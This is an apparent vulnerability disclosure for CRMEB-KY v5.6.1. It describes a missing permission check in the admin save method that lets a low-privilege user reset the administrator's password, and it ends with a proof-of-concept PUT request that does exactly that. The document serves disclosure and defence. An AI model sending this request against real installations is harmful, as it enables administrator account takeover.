# Vendor

crmeb

# Product

CRMEB-KY

# version

v5.6.1

# Download 

https://github.com/crmeb/CRMEB

# Vulnerability

Low permission users can reset administrator password

# Description

As you can see from the code, the save method receives a $id and a $data array containing the new data. It first gets administrator information from the database based on $id, and then, if the pwd field is included in $data, it updates the administrator's password. 
This code itself does not check whether the current operator has permission to modify the target user ($id)

# Analysis

Locating the Vulnerable Interface.The request provided by the user is PUT /adminapi/setting/admin/1. According to RESTful API design standards and the project structure, this request typically routes to the update method of SystemAdminController, which is used to update the information of the administrator with ID 1.

The update method calls the save() method in app/services/system/admin/SystemAdminServices.php to perform the actual update operation. Letâ€™s review the key code of the save() method:

<img width="576" height="423" alt="image" src="https://github.com/user-attachments/assets/08d5eba1-6030-4645-85ae-285192b02bc5" />

Recurrence of vulnerabilities:

Log in to the low-privilege account test:

<img width="1616" height="986" alt="image" src="https://github.com/user-attachments/assets/aeb2202f-a840-4266-a826-07fae7d3a7c3" />

Successfully changed admin's password to 1234567

<img width="1028" height="486" alt="image" src="https://github.com/user-attachments/assets/b66cbaed-a14e-4dc2-837c-8ed38ec37794" />

Login Verification:
<img width="1456" height="1351" alt="image" src="https://github.com/user-attachments/assets/558ed1b6-a90f-4e13-870a-f7122257e832" />


# POC
```
PUT /adminapi/setting/admin/1 HTTP/1.1
Host: 127.0.0.1:81
Content-Length: 99
Content-Type: application/json;charset=UTF-8
Authori-zation: XXX
Connection: keep-alive

{"account":"admin","pwd":"1234567","conf_pwd":"1234567","real_name":"admin","roles":[1],"status":1}

```
